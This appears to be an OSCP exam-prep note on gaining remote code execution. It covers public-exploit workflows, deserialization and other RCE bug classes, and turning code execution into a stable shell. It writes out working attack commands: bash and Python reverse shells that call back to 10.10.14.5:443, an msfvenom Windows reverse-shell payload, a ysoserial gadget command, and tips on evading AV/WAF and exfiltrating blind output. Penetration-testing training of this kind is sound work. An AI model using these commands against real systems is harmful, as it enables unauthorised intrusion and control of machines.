# 💥 RCE — Remote Code Execution (getting the shell)

> The destination of most Initial Access work: **arbitrary code execution on the target**. This note covers the two OSCP routes — **known-CVE / public-exploit RCE** (fingerprint → searchsploit → run) and **deserialization/other direct-RCE bugs** — plus how to turn *any* code-exec primitive into a **stable reverse shell**. The technique notes ([[File Upload]], [[Command Injection]], [[SQL Injection]], [[SSTI]], [[LFI]], [[RFI]]) feed into here.

Related: [[Web Exploitation]] · [[Shells]] · [[HTTP]] · [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]] · [[Credential Attacks]]

---

## 🧠 GOING FOR RCE → THINK
- **Known product + exact version?** → `searchsploit`/nuclei — a public PoC is the fastest OSCP shell.
- **Read the exploit before running it** — understand LHOST/LPORT/URL params; edit paths; never blind-run.
- **Java/Python/PHP/.NET/Ruby app taking serialized input / uploads / admin config?** → deserialization / template / config-write RCE.
- The moment you can run one command → **get a reverse shell**, then upgrade ([[Shells]]).
- **Match arch/OS** (x86/x64, Linux/Windows) to the payload.

## ⚡ KNOWN-CVE WORKFLOW (highest yield)
```bash
searchsploit <product> <version>
```
```bash
searchsploit -m <exploit-id>          # copy a PoC locally to read/edit
```
```bash
nuclei -u http://$IP -t http/          # flags known CVEs/misconfigs
```
Then: **read the PoC**, set `LHOST`/`LPORT`/target URL, start a listener, run it. Prefer scripts you can inspect over opaque binaries.

## 🧩 DIRECT-RCE BUG CLASSES
| Class | Where | Approach |
|---|---|---|
| Deserialization | Java (`ysoserial`), PHP (`phpggc` object injection), Python `pickle`, .NET `BinaryFormatter`, Ruby `Marshal` | build a gadget-chain payload → send to the sink |
| Template injection | templated fields | [[SSTI]] |
| OS command sink | utility features | [[Command Injection]] |
| File write to webroot | upload / SQLi OUTFILE | [[File Upload]] / [[SQL Injection]] |
| Include your code | LFI+poison / RFI | [[LFI]] / [[RFI]] |
| Admin panel → code | theme/plugin editor, task runner, deploy | log in ([[Credential Attacks]]) → edit code / upload plugin |
| DB → OS | MSSQL `xp_cmdshell`, Postgres `COPY FROM PROGRAM` | [[MSSQL]] / [[PostgreSQL]] |

### Java deserialization (ysoserial) example
```bash
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,<b64>}|{base64,-d}|bash' > payload.bin
```
Deliver `payload.bin` to the deserialization sink (cookie, param, upload, RMI/JMX) as the specific exploit requires.

## 🐚 ANY EXEC → STABLE SHELL
Start the listener:
```bash
nc -lvnp 443
```
Fire one of these via your exec primitive (Linux):
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
```
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```
Windows (base64 PowerShell one-liner recommended):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o rev.exe
```
Then **upgrade the shell** (TTY, `stty`, rlwrap) and set up **file transfer** — all in [[Shells]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Version has public PoC | Fast RCE | read → set LHOST → run | shell |
| One-command exec | Foothold | reverse-shell one-liner | shell |
| Deserialization sink | Gadget RCE | ysoserial/phpggc → deliver | shell |
| Admin panel access | Code write | plugin/theme/task → webshell | shell |
| DB sysadmin/superuser | OS exec | xp_cmdshell / COPY FROM PROGRAM | shell |
| Shell as low-priv | Escalate | winPEAS/linPEAS | SYSTEM/root |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| PoC doesn't work | Check exact version/arch/OS; edit offsets/URLs/LHOST; try another PoC |
| Multiple PoCs, unsure | Prefer readable scripts; test in your own lab notes; adapt paths |
| Reverse shell won't connect | Change port (443/53/80), try another one-liner, `curl\|bash`, check egress → [[Shells]] |
| Payload killed by AV/WAF | Encode/obfuscate; use a different transport; staged vs stageless |
| Only blind exec | Exfil output via curl/DNS; stage a shell that calls back |
| No public exploit | Pivot to a manual bug class (table above) or another service |

## 🧹 POST-EXPLOITATION
Stabilise ([[Shells]]) → `id`/`whoami` → loot webroot/app configs → [[Credential Attacks]] → escalate ([[Linux Privilege Escalation]] / [[Windows Privilege Escalation]]; `iis apppool`/service accounts often have `SeImpersonate` → potato → SYSTEM).

## ⚠️ COMMON MISTAKES
- **Blind-running** exploits without reading them (wrong LHOST/target, or malicious code).
- Ignoring **exact version** — the #1 reason a PoC fails.
- Getting exec but staying in a **non-interactive** shell — upgrade immediately.
- Wrong **arch/OS** payload.
- Forgetting DB-to-OS RCE ([[MSSQL]]/[[PostgreSQL]]) when you already have DB access.

## 🧭 OSCP EXAM MINDSET
Two mindsets win RCE: (1) *fingerprint → searchsploit → read → run* for known software, and (2) *match the input to a bug class* for custom apps. Always read a PoC before firing it, always match arch/OS, and the instant you get code execution, **convert it to a stable reverse shell** and start privesc — don't linger in a fragile webshell.

## ✅ DON'T MISS
- [ ] `searchsploit`/nuclei on the **exact version**
- [ ] **Read/edit** the PoC (LHOST/LPORT/URL/arch)
- [ ] Match bug class for custom apps (deserialization/SSTI/upload/…)
- [ ] Reverse shell + **upgrade to TTY** ([[Shells]])
- [ ] Loot creds → reuse → escalate

## 📇 CHEAT SHEET
```bash
searchsploit <product> <version> ; searchsploit -m <id>
```
```bash
nc -lvnp 443
```
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'      # Linux reverse
```
```bash
java -jar ysoserial.jar CommonsCollections5 '<cmd>' > payload.bin   # Java deser
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o rev.exe   # Windows
```
**Kill shots:** version→PoC→shell · bug-class→exec→reverse shell → upgrade → privesc.
